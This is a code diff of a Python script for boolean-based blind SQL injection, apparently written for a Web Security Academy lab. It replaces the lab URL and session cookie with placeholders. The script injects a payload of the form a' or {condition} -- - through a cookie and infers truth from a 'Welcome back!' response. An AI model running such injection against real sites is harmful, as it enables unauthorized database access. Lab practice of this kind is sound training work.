@@ -6,8 +6,7 @@ def boolean_based_blind(condition):
     # Change this function
     # print(condition)
     cookies = {
-        'TrackingId': f'a\' or {condition} -- -',
-        'session': 'EEtwBrH3IopFijck9nYaC6FFS9JHGfZ8',
+        'change me': f'a\' or {condition} -- -',
     }
 
     headers = {
@@ -24,8 +23,8 @@ def boolean_based_blind(condition):
         'Cache-Control': 'max-age=0',
     }
 
-    response = requests.get('https://ac601f431f9d515ec0a1878c009000f8.web-security-academy.net/', headers=headers, cookies=cookies)
-    if "Welcome back!" in response.text: 
+    response = requests.get('https://change_me_meow_meow/', headers=headers, cookies=cookies)
+    if "Change me meow meow" in response.text: 
         # Change the condition
         return True
     else:
